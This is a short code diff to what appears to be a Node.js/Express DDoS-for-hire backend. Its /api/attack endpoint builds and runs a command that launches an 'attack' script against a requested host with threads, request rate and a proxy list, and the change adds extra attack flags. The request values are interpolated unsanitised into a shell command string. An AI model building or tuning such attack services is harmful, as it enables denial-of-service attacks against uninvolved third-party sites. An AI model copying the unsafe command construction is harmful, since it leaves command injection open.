@@ -29,7 +29,7 @@ app.get("/api/attack", (req, res) => {
     return res.status(400).json({ status: "ERROR", message: validationMessage, statusCode: 400 });
 
   activeAttacks++;
-  const command = `node --max-old-space-size=65536 attack -m ${modul} -u ${host} -s ${time} -t ${threads} -r ${rate} -p live.txt --debug false`;
+  const command = `node --max-old-space-size=65536 attack -m ${modul} -u ${host} -s ${time} -t ${threads} -r ${rate} -p live.txt --full true --ratelimit true --delay 1 --debug false`;
   executeAttack(command, res, host, port, time, method);
 });
 
